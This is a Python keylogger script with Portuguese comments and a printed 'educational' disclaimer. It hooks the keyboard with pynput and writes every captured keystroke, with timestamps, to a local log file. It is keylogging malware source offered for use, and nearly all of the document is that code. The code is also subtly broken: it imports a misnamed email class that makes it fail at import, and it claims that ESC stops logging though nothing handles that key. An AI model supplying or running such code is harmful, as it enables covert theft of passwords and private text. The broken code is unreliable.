# keylogger_simple.py
from pynput import keyboard
import datetime
import smtplib
from email.mime.text import MimeText
import threading
import time

class SimpleKeylogger:
    def __init__(self, log_file="keylog.txt", interval=60):
        self.log_file = log_file
        self.interval = interval
        self.keys_pressed = []
        
    def on_press(self, key):
        try:
            # Capturar tecla normal
            if hasattr(key, 'char') and key.char is not None:
                self.keys_pressed.append(key.char)
            else:
                # Teclas especiais
                self.keys_pressed.append(f"[{key}]")
                
        except Exception as e:
            print(f"Erro: {e}")
            
        # Salvar a cada 10 teclas
        if len(self.keys_pressed) >= 10:
            self.save_log()
    
    def save_log(self):
        """Salva as teclas pressionadas no arquivo"""
        if self.keys_pressed:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"\n[{timestamp}] {''.join(self.keys_pressed)}\n")
            self.keys_pressed = []
            print("✅ Log salvo!")
    
    def start_logging(self):
        """Inicia o keylogger"""
        print("🔍 Keylogger iniciado... Pressione ESC para parar")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# Uso educativo
if __name__ == "__main__":
    print("⚠️  AVISO: Este é um projeto EDUCACIONAL!")
    print("Não use para atividades maliciosas!\n")
    
    logger = SimpleKeylogger()
    logger.start_logging()
